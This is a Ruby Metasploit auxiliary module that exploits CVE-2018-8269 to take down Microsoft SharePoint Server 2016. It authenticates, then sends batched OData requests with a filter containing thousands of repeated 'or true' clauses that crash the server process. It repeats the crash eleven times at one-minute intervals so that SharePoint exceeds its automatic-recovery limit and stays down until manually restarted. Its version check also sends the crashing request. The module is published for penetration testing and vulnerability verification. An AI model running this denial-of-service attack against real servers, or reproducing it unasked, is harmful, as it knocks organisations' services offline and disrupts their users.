##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'sharepoint-ruby'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos
  include Msf::Exploit::Remote::HttpClient


  def initialize(info = {})
    super(update_info(info,
                      'Name'        => 'DOS Vulnerability in SharePoint 2016 Server',
                      'Description'    => %q{
          A vulnerability in Microsoft SharePoint Server could allow a remote attacker to make the server unavailable.
          The vulnerability is a result of the dependency SharePoint has in Microsoft.Data.OData library which was
          vulnerable to remote DOS (See CVE-2018-8269). The exploit is done by sending a crafted request that contains
          an OData filter that triggers the vulnerability in Microsoft.Data.OData library. Sending such request, will
          terminate the process that runs the server. By default, SharePoint server is configured to recover a
          terminated process, but it will do so only 10 times. If more than 10 malicious requests are sent in 5
          minutes interval, the server will not recover and will be down until it is manually restarted.
      },
                      'Author'         =>
                          [
                              'Gil Mirmovitch', # Vulnerability discover and poc
                              'Gal Zror'        # Metasploit module
                          ],
                      'Platform'    => 'win',
                      'References'     =>
                          [
                              [ 'CVE', '2018-8269' ],
                              [ 'ALEPH', '2018002' ]
                          ],
                      'Targets'     =>
                          [
                              [ 'Microsoft Office SharePoint Server 2016', { } ],
                          ],

                      ))

    register_options(
        [
            Opt::RPORT(443),
            OptString.new('SSL',  [true, 'Negotiate SSL/TLS for outgoing connections', true]),
            OptString.new('USERNAME',  [false, 'The username to login with']),
            OptString.new('PASSWORD',  [false, 'The password to login with']),
            OptString.new('SITES',  [false, 'Accessible URL site']),
            OptString.new('VHOST',  [true, 'HTTP server virtual host'])
        ])
  end

  def fetch_auth_cookie
    print_status("Fetching Authentication Cookie")
    begin
      site = Sharepoint::Site.new vhost, 'server-relative-site-url'
      site.session.authenticate datastore['USERNAME'], datastore['PASSWORD']
      return site.session.cookie
    rescue Sharepoint::Session::AuthenticationFailed
      fail_with(Failure::NoAccess, "Authentication failed")
    end
    print_good("Authentication Succeeded")
  end

  def extract_digest_value(cookie)
    token_api_uri = '/_api/contextinfo'
    unless datastore['SITES'].nil?
      token_api_uri = datastore['SITES'] + token_api_uri
    end

    res = send_request_cgi( {
                                'method' => 'POST',
                                'uri' => normalize_uri(token_api_uri),
                                'cookie' => cookie,
                            })
    if res.nil?
      fail_with(Failure::UnexpectedReply, "Empty context response")
    end
    res.get_xml_document.xpath('//d:FormDigestValue').text
  end

  def check_sp_version()
    res = send_request_cgi
    unless res.nil? and res.present?
      sp_version = res.headers['MicrosoftSharePointTeamServices'].to_s
      print_status("MicrosoftSharePointTeamServices - " + sp_version)
      unless sp_version.start_with?('16.0')
        print_bad("Exploit support only SharePoint 2016")
        return false
      end
    end
    true
  end

  def send_dos_request
    send_request(6100)
  end

  def send_innocent_request
    send_request(5)
  end

  def send_request(reps)
    api_uri="/_api"
    unless datastore['SITES'].nil?
      api_uri = datastore['SITES'] + api_uri
    end
    print_status("Request URI - " + api_uri)

    cookie = datastore['COOKIE']
    data = Rex::MIME::Message.new
    data.add_part(
        "GET "+ api_uri + "/web/lists?$filter=true" + "+or+true" * reps + " HTTP/1.1\r\n" +
            "accept: application/json;odata.metadata=minimal\r\n", #Data is our payload
        'application/http',                                       #Content Type
        'binary',                                                 #Transfer Encoding
        nil                                                       #Content Disposition
    )

    send_request_cgi({
                         'method'   => 'POST',
                         'uri'      => normalize_uri(api_uri + "/$batch"),
                         'ctype'  => "multipart/mixed; boundary=#{data.bound}",
                         'data'   => data.to_s,
                         'cookie' => cookie,
                         'headers'      => {
                             'x-requestdigest'	=> extract_digest_value(cookie),
                         }
                     })
  end

  def dos
    print_status("Sending DOS malicious requests...")
    (0..10).each {|i|
      print_status("Countdown #{10 - i}...")
      send_dos_request
      sleep(60)
    }
  end

  def get_available_site
    print_status("Searching for available site")
    cookie = datastore['COOKIE']
    search_uri = "/search/_api/search/query"
    res = send_request_cgi({
                         'method'   => 'GET',
                         'uri'      => normalize_uri(search_uri),
                         'cookie' => cookie,
                         'vars_get' => {
                             'QueryText' => "'ContentClass:STS_Site'",
                             'SelectProperties' => "'SiteName'",
                             'StartRow' => 0,
                             'RowLimit' => 1,
                         }
                     })
    begin
      return res.get_xml_document.xpath("//d:Cells/d:element[d:Key='SiteName']/d:Value").text
    rescue
      print_error("Could not found any available site")
      return nil
    end
  end

  def check
    print_status("Checking SharePoint version")
    unless check_sp_version
      print_error("Unsupported SharePoint version")
      return Exploit::CheckCode::Safe
    end

    if datastore['USERNAME'].present? and datastore['PASSWORD'].present?
      datastore['COOKIE'] = fetch_auth_cookie
    end

    print_status("Sending innocent request...")
    res = send_innocent_request

    if res and res.code == 200
      print_good("Server responded 200 to innocent request")
    else
      print_bad("Server response " + res.code.to_s + " to innocent request")
      return Exploit::CheckCode::Unknown
    end

    print_status("Sending malicious request...")
    begin
      res = send_dos_request
    rescue Errno::ECONNRESET
      res = nil
    end

    if res.nil?
      Exploit::CheckCode::Vulnerable
    else
      print_bad("Server response " + res.code.to_s + " to malicious request")
      if res.body.to_s.include? "Access denied." and not datastore['SITES'].present?
        print_status("Request returned access denied")
        site_url = get_available_site
        unless site_url.present?
          return Exploit::CheckCode::Safe
        end
        print_status("Sites uri updated - " + site_url[/\/sites.*/])
        datastore['SITES'] = site_url[/\/sites.*/]
        res = send_dos_request
        if res.nil?
          return Exploit::CheckCode::Vulnerable
        end
      end

      Exploit::CheckCode::Safe
    end
  end

  def run
    if check == Exploit::CheckCode::Vulnerable
      dos
    end
  end
end
